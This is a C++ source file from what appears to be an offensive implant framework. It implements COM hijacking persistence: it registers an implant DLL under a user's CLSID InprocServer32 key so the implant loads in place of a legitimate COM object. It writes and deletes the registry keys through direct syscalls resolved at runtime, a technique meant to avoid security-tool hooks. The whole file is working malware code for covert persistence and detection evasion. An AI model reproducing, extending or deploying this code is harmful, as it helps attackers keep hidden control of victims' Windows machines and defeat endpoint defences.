#include "ComHijacker.h"
#include "../evasion/Syscalls.h"
#include "../evasion/NtStructs.h"
#include "../utils/Obfuscator.h"
#include "../utils/Logger.h"
#include "../utils/Shared.h"
#include <vector>

namespace persistence {

bool ComHijacker::Install(const std::wstring& implantPath, const std::wstring& clsid) {
    LOG_DEBUG("ComHijacker::Install started");
    HKEY hBase = NULL;
    // We target HKCU\Software\Classes\CLSID
    if (RegOpenKeyExW(HKEY_CURRENT_USER, L"Software\\Classes\\CLSID", 0, KEY_ALL_ACCESS, &hBase) != ERROR_SUCCESS) {
        LOG_ERR("RegOpenKeyExW failed for HKCU CLSID");
        return false;
    }

    auto& resolver = evasion::SyscallResolver::GetInstance();
    DWORD ntCreateKeySsn = resolver.GetServiceNumber("NtCreateKey");
    DWORD ntSetValueKeySsn = resolver.GetServiceNumber("NtSetValueKey");
    DWORD ntCloseSsn = resolver.GetServiceNumber("NtClose");

    std::wstring clsidPath = clsid + L"\\InprocServer32";
    UNICODE_STRING uClsidPath;
    uClsidPath.Buffer = (PWSTR)clsidPath.c_str();
    uClsidPath.Length = (USHORT)(clsidPath.length() * sizeof(wchar_t));
    uClsidPath.MaximumLength = uClsidPath.Length + sizeof(wchar_t);

    OBJECT_ATTRIBUTES objAttr;
    InitializeObjectAttributes(&objAttr, &uClsidPath, OBJ_CASE_INSENSITIVE, hBase, NULL);

    HANDLE hKey = NULL;
    ULONG disp = 0;
    NTSTATUS status = InternalDoSyscall(ntCreateKeySsn, &hKey, KEY_ALL_ACCESS, &objAttr, 0, NULL, 0, &disp);

    if (NT_SUCCESS(status)) {
        LOG_DEBUG("NtCreateKey successful for " + utils::ws2s(clsidPath));
        // Set default value (implant path)
        UNICODE_STRING uEmpty = {0, 0, NULL};
        InternalDoSyscall(ntSetValueKeySsn, hKey, &uEmpty, 0, REG_SZ, (PVOID)implantPath.c_str(), (ULONG)((implantPath.length() + 1) * sizeof(wchar_t)));

        // Set ThreadingModel
        std::wstring tm = L"ThreadingModel";
        UNICODE_STRING uTm;
        uTm.Buffer = (PWSTR)tm.c_str();
        uTm.Length = (USHORT)(tm.length() * sizeof(wchar_t));
        uTm.MaximumLength = uTm.Length + sizeof(wchar_t);

        std::wstring tmVal = L"Both";
        InternalDoSyscall(ntSetValueKeySsn, hKey, &uTm, 0, REG_SZ, (PVOID)tmVal.c_str(), (ULONG)((tmVal.length() + 1) * sizeof(wchar_t)));

        InternalDoSyscall(ntCloseSsn, hKey);
        LOG_INFO("COM registration keys set via syscalls.");
    } else {
        LOG_ERR("NtCreateKey failed: 0x" + std::to_string(status));
    }

    RegCloseKey(hBase);
    return NT_SUCCESS(status);
}

bool ComHijacker::Uninstall(const std::wstring& clsid) {
    HKEY hBase = NULL;
    if (RegOpenKeyExW(HKEY_CURRENT_USER, L"Software\\Classes\\CLSID", 0, KEY_ALL_ACCESS, &hBase) != ERROR_SUCCESS) {
        return false;
    }

    auto& resolver = evasion::SyscallResolver::GetInstance();
    DWORD ntOpenKeySsn = resolver.GetServiceNumber("NtOpenKey");
    DWORD ntDeleteKeySsn = resolver.GetServiceNumber("NtDeleteKey");
    DWORD ntCloseSsn = resolver.GetServiceNumber("NtClose");

    UNICODE_STRING uClsid;
    uClsid.Buffer = (PWSTR)clsid.c_str();
    uClsid.Length = (USHORT)(clsid.length() * sizeof(wchar_t));
    uClsid.MaximumLength = uClsid.Length + sizeof(wchar_t);

    OBJECT_ATTRIBUTES objAttr;
    InitializeObjectAttributes(&objAttr, &uClsid, OBJ_CASE_INSENSITIVE, hBase, NULL);

    HANDLE hKey = NULL;
    NTSTATUS status = InternalDoSyscall(ntOpenKeySsn, &hKey, KEY_ALL_ACCESS, &objAttr);
    if (NT_SUCCESS(status)) {
        // Delete InprocServer32 first
        std::wstring sub = L"InprocServer32";
        UNICODE_STRING uSub;
        uSub.Buffer = (PWSTR)sub.c_str();
        uSub.Length = (USHORT)(sub.length() * sizeof(wchar_t));
        uSub.MaximumLength = uSub.Length + sizeof(wchar_t);

        OBJECT_ATTRIBUTES subAttr;
        InitializeObjectAttributes(&subAttr, &uSub, OBJ_CASE_INSENSITIVE, hKey, NULL);

        HANDLE hSubKey = NULL;
        if (NT_SUCCESS(InternalDoSyscall(ntOpenKeySsn, &hSubKey, KEY_ALL_ACCESS, &subAttr))) {
            InternalDoSyscall(ntDeleteKeySsn, hSubKey);
            InternalDoSyscall(ntCloseSsn, hSubKey);
        }

        status = InternalDoSyscall(ntDeleteKeySsn, hKey);
        InternalDoSyscall(ntCloseSsn, hKey);
    }

    RegCloseKey(hBase);
    return NT_SUCCESS(status);
}

} // namespace persistence
